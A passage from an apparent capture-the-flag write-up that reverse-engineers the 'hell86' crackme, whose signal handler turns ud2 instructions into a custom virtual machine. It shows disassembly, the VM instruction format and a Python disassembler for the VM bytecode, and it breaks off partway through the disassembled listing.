&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#ae81ff">0x000019a7&lt;/span> &lt;span style="color:#ae81ff">31&lt;/span>d2 xor edx, edx ; &lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#a6e22e">sigaction&lt;/span> &lt;span style="color:#f92672">*&lt;/span>oldact
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#ae81ff">0x000019a9&lt;/span> bf04000000 mov edi, &lt;span style="color:#ae81ff">4&lt;/span> ; &lt;span style="color:#66d9ef">int&lt;/span> signum
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#ae81ff">0x000019ae&lt;/span> &lt;span style="color:#ae81ff">4889&lt;/span>de mov rsi, rbx ; &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#a6e22e">sigaction&lt;/span> &lt;span style="color:#f92672">*&lt;/span>act
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#ae81ff">0x000019b1&lt;/span> e8daf5ffff call sym.imp.sigaction ; &lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">sigaction&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> signum, &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#a6e22e">sigaction&lt;/span> &lt;span style="color:#f92672">*&lt;/span>act, &lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#a6e22e">sigaction&lt;/span> &lt;span style="color:#f92672">*&lt;/span>oldact)
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#ae81ff">0x000019b6&lt;/span> &lt;span style="color:#ae81ff">85&lt;/span>c0 test eax, eax
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#ae81ff">0x000019b8&lt;/span> &lt;span style="color:#ae81ff">0f&lt;/span>&lt;span style="color:#ae81ff">94&lt;/span>c2 sete dl
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> ; CODE XREF from sigill_handler &lt;span style="color:#960050;background-color:#1e0010">@&lt;/span> &lt;span style="color:#ae81ff">0x19a0&lt;/span>
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">└─&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">0x000019bb&lt;/span> &lt;span style="color:#ae81ff">4881&lt;/span>c4a00000. add rsp, &lt;span style="color:#ae81ff">0xa0&lt;/span>
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#ae81ff">0x000019c2&lt;/span> &lt;span style="color:#ae81ff">88&lt;/span>d0 mov al, dl
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#ae81ff">0x000019c4&lt;/span> &lt;span style="color:#ae81ff">5&lt;/span>b pop rbx
&lt;span style="color:#960050;background-color:#1e0010">└&lt;/span> &lt;span style="color:#ae81ff">0x000019c5&lt;/span> c3 ret
&lt;/code>&lt;/pre>&lt;/div>&lt;p>lets dig deep down the handler routine&lt;/p>
&lt;p>The handler holds a struct uncontext and in which uc_mcontext holds the GPR&amp;rsquo;s (general purpose registers) for hell86 and as we see it uses the same registers of the x64 architecture for hell86&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-cpp" data-lang="cpp">gef&lt;span style="color:#960050;background-color:#1e0010">➤&lt;/span> ptype ucontext_t
type &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#a6e22e">ucontext_t&lt;/span> {
&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> uc_flags;
&lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#a6e22e">ucontext_t&lt;/span> &lt;span style="color:#f92672">*&lt;/span>uc_link;
stack_t uc_stack;
mcontext_t uc_mcontext;
sigset_t uc_sigmask;
&lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#a6e22e">_libc_fpstate&lt;/span> __fpregs_mem;
&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> __ssp[&lt;span style="color:#ae81ff">4&lt;/span>];
}
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-cpp" data-lang="cpp">gef&lt;span style="color:#960050;background-color:#1e0010">➤&lt;/span> ptype mcontext_t
type &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">struct&lt;/span> {
gregset_t gregs;
fpregset_t fpregs;
&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> __reserved1[&lt;span style="color:#ae81ff">8&lt;/span>];
}
gef&lt;span style="color:#960050;background-color:#1e0010">➤&lt;/span> ptype gregset_t
type &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> [&lt;span style="color:#ae81ff">23&lt;/span>]
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="/images/gpr.png" alt="">&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-cpp" data-lang="cpp">;DATA XREF from fcn&lt;span style="color:#ae81ff">.00001965&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">@&lt;/span> &lt;span style="color:#ae81ff">0x197b&lt;/span>
&lt;span style="color:#ae81ff">0x00001946&lt;/span> &lt;span style="color:#ae81ff">488&lt;/span>b82a80000. mov rax, qword [rdx &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0xa8&lt;/span>] ; rax &lt;span style="color:#f92672">=&lt;/span> addr of ud2
&lt;span style="color:#ae81ff">0x0000194d&lt;/span> &lt;span style="color:#ae81ff">488&lt;/span>d7228 lea rsi, [rdx &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x28&lt;/span>] ; rsi &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">register&lt;/span>(ucontext_t)
&lt;span style="color:#ae81ff">0x00001951&lt;/span> &lt;span style="color:#ae81ff">488&lt;/span>d7802 lea rdi, [rax &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>] ; rdi &lt;span style="color:#f92672">=&lt;/span> the next bytes after the encountered ud2
&lt;span style="color:#ae81ff">0x00001955&lt;/span> &lt;span style="color:#ae81ff">4883&lt;/span>c00e add rax, &lt;span style="color:#ae81ff">0xe&lt;/span> ; rax &lt;span style="color:#f92672">=&lt;/span> points to the enocountered ud2 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0xe&lt;/span> &lt;span style="color:#f92672">=&lt;/span> next ud2
&lt;span style="color:#ae81ff">0x00001959&lt;/span> &lt;span style="color:#ae81ff">488982&lt;/span>a80000. mov qword [rdx &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0xa8&lt;/span>], rax
&lt;span style="color:#ae81ff">0x00001960&lt;/span> e97b050000 jmp &lt;span style="color:#ae81ff">0x1ee0&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-cpp" data-lang="cpp"> ; CODE XREF from fcn&lt;span style="color:#ae81ff">.00001192&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">@&lt;/span> &lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">0x7ce&lt;/span>
&lt;span style="color:#ae81ff">0x00001ee0&lt;/span> &lt;span style="color:#ae81ff">0f&lt;/span>b65708 movzx edx, byte [rdi &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>]
&lt;span style="color:#ae81ff">0x00001ee4&lt;/span> &lt;span style="color:#ae81ff">488&lt;/span>d05951120. lea rax, [&lt;span style="color:#ae81ff">0x00203080&lt;/span>]
&lt;span style="color:#ae81ff">0x00001eeb&lt;/span> ff24d0 jmp qword [rax &lt;span style="color:#f92672">+&lt;/span> rdx&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#ae81ff">8&lt;/span>]
&lt;span style="color:#ae81ff">0x00001eee&lt;/span> &lt;span style="color:#ae81ff">6690&lt;/span> nop
&lt;/code>&lt;/pre>&lt;/div>&lt;p>The byte at &lt;code>rdi+8&lt;/code> indexes a jump table at &lt;code>0x00203080&lt;/code> and the jump table which consists of 50 instructions for the vm to use and they are shown below&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="color:#ae81ff">0x00203080&lt;/span> &lt;span style="color:#ae81ff">0x0000000000001a1f&lt;/span> &lt;span style="color:#ae81ff">0x0000000000001a20&lt;/span> ........ .......
&lt;span style="color:#ae81ff">0x00203090&lt;/span> &lt;span style="color:#ae81ff">0x0000000000001a39&lt;/span> &lt;span style="color:#ae81ff">0x0000000000001a52&lt;/span> &lt;span style="color:#ae81ff">9.&lt;/span>......R.......
&lt;span style="color:#ae81ff">0x002030a0&lt;/span> &lt;span style="color:#ae81ff">0x0000000000001a6c&lt;/span> &lt;span style="color:#ae81ff">0x0000000000001a87&lt;/span> l...............
&lt;span style="color:#ae81ff">0x002030b0&lt;/span> &lt;span style="color:#ae81ff">0x0000000000001aa2&lt;/span> &lt;span style="color:#ae81ff">0x0000000000001abe&lt;/span> ................
&lt;span style="color:#ae81ff">0x002030c0&lt;/span> &lt;span style="color:#ae81ff">0x0000000000001ae6&lt;/span> &lt;span style="color:#ae81ff">0x0000000000001ada&lt;/span> ................
&lt;span style="color:#ae81ff">0x002030d0&lt;/span> &lt;span style="color:#ae81ff">0x0000000000001afa&lt;/span> &lt;span style="color:#ae81ff">0x0000000000001b12&lt;/span> ................
&lt;span style="color:#ae81ff">0x002030e0&lt;/span> &lt;span style="color:#ae81ff">0x0000000000001b2b&lt;/span> &lt;span style="color:#ae81ff">0x0000000000001b43&lt;/span> &lt;span style="color:#f92672">+&lt;/span>.......C.......
&lt;span style="color:#ae81ff">0x002030f0&lt;/span> &lt;span style="color:#ae81ff">0x0000000000001b5c&lt;/span> &lt;span style="color:#ae81ff">0x0000000000001b73&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>.......s.......
&lt;span style="color:#ae81ff">0x00203100&lt;/span> &lt;span style="color:#ae81ff">0x0000000000001b8b&lt;/span> &lt;span style="color:#ae81ff">0x0000000000001ba3&lt;/span> ................
&lt;span style="color:#ae81ff">0x00203110&lt;/span> &lt;span style="color:#ae81ff">0x0000000000001bba&lt;/span> &lt;span style="color:#ae81ff">0x0000000000001bd2&lt;/span> ................
&lt;span style="color:#ae81ff">0x00203120&lt;/span> &lt;span style="color:#ae81ff">0x0000000000001be9&lt;/span> &lt;span style="color:#ae81ff">0x0000000000001c01&lt;/span> ................
&lt;span style="color:#ae81ff">0x00203130&lt;/span> &lt;span style="color:#ae81ff">0x0000000000001c1a&lt;/span> &lt;span style="color:#ae81ff">0x0000000000001c2e&lt;/span> ................
&lt;span style="color:#ae81ff">0x00203140&lt;/span> &lt;span style="color:#ae81ff">0x0000000000001c43&lt;/span> &lt;span style="color:#ae81ff">0x0000000000001c54&lt;/span> C.......T.......
&lt;span style="color:#ae81ff">0x00203150&lt;/span> &lt;span style="color:#ae81ff">0x0000000000001c6d&lt;/span> &lt;span style="color:#ae81ff">0x0000000000001c86&lt;/span> m...............
&lt;span style="color:#ae81ff">0x00203160&lt;/span> &lt;span style="color:#ae81ff">0x0000000000001c9f&lt;/span> &lt;span style="color:#ae81ff">0x0000000000001cb3&lt;/span> ................
&lt;span style="color:#ae81ff">0x00203170&lt;/span> &lt;span style="color:#ae81ff">0x0000000000001cd2&lt;/span> &lt;span style="color:#ae81ff">0x0000000000001cf1&lt;/span> ................
&lt;span style="color:#ae81ff">0x00203180&lt;/span> &lt;span style="color:#ae81ff">0x0000000000001d10&lt;/span> &lt;span style="color:#ae81ff">0x0000000000001d2f&lt;/span> ........&lt;span style="color:#f92672">/&lt;/span>.......
&lt;span style="color:#ae81ff">0x00203190&lt;/span> &lt;span style="color:#ae81ff">0x0000000000001d4e&lt;/span> &lt;span style="color:#ae81ff">0x0000000000001d6d&lt;/span> N.......m.......
&lt;span style="color:#ae81ff">0x002031a0&lt;/span> &lt;span style="color:#ae81ff">0x0000000000001d87&lt;/span> &lt;span style="color:#ae81ff">0x0000000000001da1&lt;/span> ................
&lt;span style="color:#ae81ff">0x002031b0&lt;/span> &lt;span style="color:#ae81ff">0x0000000000001db9&lt;/span> &lt;span style="color:#ae81ff">0x0000000000001dcf&lt;/span> ................
&lt;span style="color:#ae81ff">0x002031c0&lt;/span> &lt;span style="color:#ae81ff">0x0000000000001de5&lt;/span> &lt;span style="color:#ae81ff">0x0000000000001e07&lt;/span> ................
&lt;span style="color:#ae81ff">0x002031d0&lt;/span> &lt;span style="color:#ae81ff">0x0000000000001e9c&lt;/span> &lt;span style="color:#ae81ff">0x0000000000001ebe&lt;/span> ................
&lt;span style="color:#ae81ff">0x002031e0&lt;/span> &lt;span style="color:#ae81ff">0x0000000000001e1e&lt;/span> &lt;span style="color:#ae81ff">0x0000000000001e32&lt;/span> .......&lt;span style="color:#ae81ff">.2&lt;/span>.......
&lt;span style="color:#ae81ff">0x002031f0&lt;/span> &lt;span style="color:#ae81ff">0x0000000000001e49&lt;/span> &lt;span style="color:#ae81ff">0x0000000000001e60&lt;/span> I.......&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>.......
&lt;span style="color:#ae81ff">0x00203200&lt;/span> &lt;span style="color:#ae81ff">0x0000000000001e74&lt;/span> &lt;span style="color:#ae81ff">0x0000000000001e88&lt;/span> t...............
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="flag-function">FLag Function&lt;/h2>
&lt;p>This is the actual flag verification function, the first instruction is actually a &lt;code>ud2&lt;/code> instruction. so what does a ud2 instruction does? 🤔&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th style="text-align:left">opcode&lt;/th>
&lt;th style="text-align:center">memonic&lt;/th>
&lt;th style="text-align:right">description&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td style="text-align:left">&lt;strong>0f 0b&lt;/strong>&lt;/td>
&lt;td style="text-align:center">&lt;strong>UD2&lt;/strong>&lt;/td>
&lt;td style="text-align:right">&lt;strong>raise invalid opcode exception&lt;/strong>&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="color:#960050;background-color:#1e0010">┌&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#f92672">:&lt;/span> flag_verification ();
&lt;span style="color:#960050;background-color:#1e0010">└&lt;/span> &lt;span style="color:#ae81ff">0x00001190&lt;/span> &lt;span style="color:#ae81ff">0f&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>b ud2
; CALL XREF from main &lt;span style="color:#960050;background-color:#1e0010">@&lt;/span> &lt;span style="color:#ae81ff">0xfed&lt;/span>
&lt;span style="color:#960050;background-color:#1e0010">┌&lt;/span> &lt;span style="color:#ae81ff">28&lt;/span>&lt;span style="color:#f92672">:&lt;/span> fcn&lt;span style="color:#ae81ff">.00001192&lt;/span> (&lt;span style="color:#66d9ef">int64_t&lt;/span> arg4);
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> ; arg &lt;span style="color:#66d9ef">int64_t&lt;/span> arg4 &lt;span style="color:#960050;background-color:#1e0010">@&lt;/span> rcx
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#ae81ff">0x00001192&lt;/span> &lt;span style="color:#ae81ff">0200&lt;/span> add al, byte [rax]
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#ae81ff">0x00001194&lt;/span> &lt;span style="color:#ae81ff">0000&lt;/span> add byte [rax], al
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#ae81ff">0x00001196&lt;/span> &lt;span style="color:#ae81ff">0000&lt;/span> add byte [rax], al
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#ae81ff">0x00001198&lt;/span> &lt;span style="color:#ae81ff">0000&lt;/span> add byte [rax], al
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#ae81ff">0x0000119a&lt;/span> &lt;span style="color:#ae81ff">090&lt;/span>d00000f0b or dword [&lt;span style="color:#ae81ff">0x0b0f11a0&lt;/span>], ecx ; [&lt;span style="color:#ae81ff">0xb0f11a0&lt;/span>&lt;span style="color:#f92672">:&lt;/span>&lt;span style="color:#ae81ff">4&lt;/span>]&lt;span style="color:#f92672">=-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span> ; arg4
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#ae81ff">0x000011a0&lt;/span> &lt;span style="color:#ae81ff">0200&lt;/span> add al, byte [rax]
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#ae81ff">0x000011a2&lt;/span> &lt;span style="color:#ae81ff">0000&lt;/span> add byte [rax], al
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#ae81ff">0x000011a4&lt;/span> &lt;span style="color:#ae81ff">0000&lt;/span> add byte [rax], al
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#ae81ff">0x000011a6&lt;/span> &lt;span style="color:#ae81ff">0000&lt;/span> add byte [rax], al
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#ae81ff">0x000011a8&lt;/span> &lt;span style="color:#ae81ff">2400&lt;/span> and al, &lt;span style="color:#ae81ff">0&lt;/span>
&lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#ae81ff">0x000011aa&lt;/span> &lt;span style="color:#ae81ff">0800&lt;/span> or byte [rax], al
&lt;/code>&lt;/pre>&lt;/div>&lt;p>The structure of the instructions for hell86 would look like this&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#a6e22e">ins&lt;/span> {
&lt;span style="color:#66d9ef">uint16_t&lt;/span> ud2;
&lt;span style="color:#66d9ef">uint64_t&lt;/span> imm;
&lt;span style="color:#66d9ef">uint8_t&lt;/span> opcode;
&lt;span style="color:#66d9ef">uint8_t&lt;/span> dest_reg;
&lt;span style="color:#66d9ef">uint8_t&lt;/span> source_reg_1;
&lt;span style="color:#66d9ef">uint8_t&lt;/span> source_reg_2;
};
&lt;/code>&lt;/pre>&lt;/div>&lt;p>As we now know the routine of the handler its pretty easy to reverse the flag verification function so that being set we&amp;rsquo;ll need to make a disassembler and a script to reverse the flag function in order to get the flag&lt;/p>
&lt;h2 id="disassembler">Disassembler&lt;/h2>
&lt;p>we can use objdump or gdb to dump the flag verification function from the binary&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="color:#960050;background-color:#1e0010">▲&lt;/span> reversing&lt;span style="color:#f92672">/&lt;/span>vm&lt;span style="color:#f92672">/&lt;/span>hell86 gef hell86
GEF &lt;span style="color:#66d9ef">for&lt;/span> linux ready, type &lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>gef&lt;span style="color:#960050;background-color:#1e0010">&amp;#39;&lt;/span> to start, &lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>gef config&lt;span style="color:#960050;background-color:#1e0010">&amp;#39;&lt;/span> to configure
&lt;span style="color:#ae81ff">92&lt;/span> commands loaded &lt;span style="color:#66d9ef">for&lt;/span> GDB &lt;span style="color:#ae81ff">10.1&lt;/span> &lt;span style="color:#66d9ef">using&lt;/span> Python engine &lt;span style="color:#ae81ff">3.9&lt;/span>
Reading symbols from hell86...
(No debugging symbols found in hell86)
gef&lt;span style="color:#960050;background-color:#1e0010">➤&lt;/span> dump binary memory flag_func &lt;span style="color:#ae81ff">0x1190&lt;/span> &lt;span style="color:#ae81ff">0x1946&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>As it was my first time creating a diassembler i got some help from a previously made disassembler.&lt;/p>
&lt;div class="collapsable-code">
&lt;input id="1" type="checkbox" checked />
&lt;label for="1">
&lt;span class="collapsable-code__language">python&lt;/span>
&lt;span class="collapsable-code__title">vm disassembler&lt;/span>
&lt;span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽">&lt;/span>
&lt;/label>
&lt;pre class="language-python" >&lt;code>
#!/usr/bin/env python3
def disassemble(instructions):
registers = [&amp;#39;r8&amp;#39;, &amp;#39;r9&amp;#39;, &amp;#39;r10&amp;#39;, &amp;#39;r11&amp;#39;, &amp;#39;r12&amp;#39;, &amp;#39;r13&amp;#39;, &amp;#39;r14&amp;#39;, &amp;#39;r15&amp;#39;, &amp;#39;rdi&amp;#39;, &amp;#39;rsi&amp;#39;,
&amp;#39;rbp&amp;#39;, &amp;#39;rbx&amp;#39;, &amp;#39;rdx&amp;#39;, &amp;#39;rax&amp;#39;, &amp;#39;rcx&amp;#39;, &amp;#39;rsp&amp;#39;, &amp;#39;rip&amp;#39;]
asm_instr = [
&amp;#39;nop&amp;#39;, # no operation
&amp;#39;{1:s} = {2:s} &amp;#43; {3:s}&amp;#39;, # addition
&amp;#39;{1:s} = {2:s} - {3:s}&amp;#39;, # subtract
&amp;#39;{1:s} = {2:s} * {3:s}&amp;#39;, # multiply
&amp;#39;{1:s} = {2:s} / {3:s}&amp;#39;, # division (quotient)
&amp;#39;{1:s} = {2:s} % {3:s}&amp;#39;, # division (reminder)
&amp;#39;{1:s} = {2:s} &amp;gt;&amp;gt; {3:s}&amp;#39;, # right shift
&amp;#39;{1:s} = {2:s} &amp;lt;&amp;lt; {3:s}&amp;#39;, # left shift
&amp;#39;{1:s} = -{2:s}&amp;#39;, # negation
&amp;#39;{1:s} = 0x{0:x}&amp;#39;, # mov a, b
&amp;#39;{1:s} = byte [{2:s}&amp;#43;0x{0:x}]&amp;#39;, # movzx
&amp;#39;{1:s} = byte [{2:s}&amp;#43;0x{0:x}]&amp;#39;, # movsx
&amp;#39;{1:s} = word [{2:s}&amp;#43;0x{0:x}]&amp;#39;, # movzx
&amp;#39;{1:s} = word [{2:s}&amp;#43;0x{0:x}]&amp;#39;, # movsx
&amp;#39;{1:s} = dword [{2:s}&amp;#43;0x{0:x}]&amp;#39;, # movzx
&amp;#39;{1:s} = dword [{2:s}&amp;#43;0x{0:x}]&amp;#39;, # movsx
&amp;#39;{1:s} = qword [{2:s}&amp;#43;0x{0:x}]&amp;#39;, # mov
&amp;#39;mov byte [{2:s}&amp;#43;0x{0:x}], {3:s}&amp;#39;,
&amp;#39;mov word [{2:s}&amp;#43;0x{0:x}], {3:s}&amp;#39;,
&amp;#39;mov dword [{2:s}&amp;#43;0x{0:x}], {3:s}&amp;#39;,
&amp;#39;mov qword [{2:s}&amp;#43;0x{0:x}], {3:s}&amp;#39;,
&amp;#39;push {2:s}&amp;#39;,
&amp;#39;push 0x{0:x}&amp;#39;,
&amp;#39;pop {1:s}&amp;#39;,
&amp;#39;{1:s} = {2:s}&amp;#39;,
&amp;#39;{1:s} = {2:s} | {3:s}&amp;#39;,
&amp;#39;{1:s} = {2:s} &amp;amp; {3:s}&amp;#39;,
&amp;#39;{1:s} = {2:s} ^ {3:s}&amp;#39;,
&amp;#39;{1:s} = ~ {2:s}&amp;#39;,
&amp;#39;cmp.s {1:s}, {2:s}, {3:s}&amp;#39;, # smaller
&amp;#39;cmp.se {1:s}, {2:s}, {3:s}&amp;#39;, # smaller or equal
&amp;#39;cmp.g {1:s}, {2:s}, {3:s}&amp;#39;, # greater
&amp;#39;cmp.ge {1:s}, {2:s}, {3:s} &amp;#39;, # greater or equal
&amp;#39;{1:s} == {3:s} ; {1:s} = 1&amp;#39;, #equal
&amp;#39;cmp.in {1:s}, {2:s}, {3:s}&amp;#39;, #inequal
&amp;#39;cmp.eq {1:s}, {2:s}, 0x{0:x}&amp;#39;, # if equal to const
&amp;#39;{2:s} != 0x{0:x} ; {1:s} = 1&amp;#39;, # if inequal to const
&amp;#39;cmp.z {1:s}, {2:s} ; {1:s} = {2:s} == 0 &amp;#39;,
&amp;#39;if {2:s} = 0 jmp 0x{0:x}&amp;#39;,
&amp;#39;if {2:s} != 0 jmp 0x{0:x}&amp;#39;,
&amp;#39;call 0x{0:x}&amp;#39;,
&amp;#39;ret&amp;#39;,
&amp;#39;if {2:s} != 0 ret&amp;#39;,
&amp;#39;if {2:s} = 0 ret&amp;#39;,
&amp;#39;lea {1:s}, [{2:s} &amp;#43; 0x{0:x}]&amp;#39;,
&amp;#39;{1:s}, {2:s} &amp;gt;&amp;gt; 0x{0:x}&amp;#39;, # rshift
&amp;#39;{1:s}, {2:s} &amp;lt;&amp;lt; 0x{0:x}&amp;#39;, # lshift
&amp;#39;{1:s}, {2:s} | 0x{0:x}&amp;#39;, # or
&amp;#39;{1:s}, {2:s} &amp;amp; 0x{0:x}&amp;#39;, # and
&amp;#39;{1:s}, {2:s} ^ 0x{0:x}&amp;#39; # xor
]
#print(len(assembly_mapping))
addr = 0x1190
for i in instructions:
print(&amp;#39;{:&amp;gt;10s}&amp;#39;.format(&amp;#39;0x{:x}: &amp;#39;.format(addr)), end=&amp;#39;&amp;#39;)
instr = int.from_bytes(i[2:10], byteorder=&amp;#39;little&amp;#39;)
opcode = i[10]
arg1 = registers[i[11]]
arg2 = registers[i[12]]
arg3 = registers[i[13]]
print(asm_instr[opcode].format(instr, arg1, arg2, arg3))
addr &amp;#43;= 14
with open(&amp;#39;flag_func&amp;#39;, &amp;#39;rb&amp;#39;) as f:
flag_func = f.read()
instructions = [flag_func[i*14:(i&amp;#43;1)*14] for i in range(len(flag_func)//14)]
disassemble(instructions)
&lt;/code>&lt;/pre>
&lt;/div>
&lt;p>Now lets take a look at the actual disassembly of the vm&lt;/p>
&lt;div class="collapsable-code">
&lt;input id="2" type="checkbox" checked />
&lt;label for="2">
&lt;span class="collapsable-code__language">nasm&lt;/span>
&lt;span class="collapsable-code__title">vm disassembly&lt;/span>
&lt;span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽">&lt;/span>
&lt;/label>
&lt;pre class="language-nasm" >&lt;code>
0x1190: rax = 0x2
0x119e: rdi != 0x2 ; r8 = 1
0x11ac: if r8 != 0 ret
0x11ba: lea rsi, [rsi &amp;#43; 0x8]
0x11c8: rdi = qword [rsi&amp;#43;0x0]
0x11d6: rip = 0x11e4
0x11e4: push rbp
0x11f2: rbp = rsp
0x1200: lea rsp, [rsp &amp;#43; 0xfffffffffffffff0]
0x120e: mov qword [rbp&amp;#43;0xfffffffffffffff0], rdi
0x121c: call 0x17da
0x122a: rax != 0x24 ; rax = 1
0x1238: if rax != 0 jmp 0x13ce
0x1246: rdi = 0x20cd
0x1254: call 0x17da
0x1262: mov qword [rbp&amp;#43;0xfffffffffffffff8], rax
0x1270: rdi = qword [rbp&amp;#43;0xfffffffffffffff0]
0x127e: rsi = 0x20cd
0x128c: rdx = rax
0x129a: call 0x182e
0x12a8: if rax != 0 jmp 0x13ce
0x12b6: rdi = qword [rbp&amp;#43;0xfffffffffffffff0]
0x12c4: rsi = byte [rdi&amp;#43;0x23]
0x12d2: rsi != 0x7d ; rsi = 1
0x12e0: if rsi != 0 jmp 0x13ce
0x12ee: rsi = qword [rbp&amp;#43;0xfffffffffffffff8]
0x12fc: rdi = rdi &amp;#43; rsi
0x130a: rsi = -rsi
0x1318: lea rsi, [rsi &amp;#43; 0x23]
0x1326: push rsi
0x1334: call 0x1406
0x1342: pop rsi
0x1350: if rax = 0 jmp 0x13ce
0x135e: rdi = rax
0x136c: push rdi
0x137a: call 0x15fe
0x1388: pop rdi
0x1396: push rax
0x13a4: call 0x0
0x13b2: pop rax
0x13c0: rip = 0x13dc
0x13ce: rax = 0x1
0x13dc: rsp = rbp
0x13ea: pop rbp
0x13f8: ret
0x1406: rax = 0x0
0x1414: if rsi = 0 ret
0x1422: push rdi
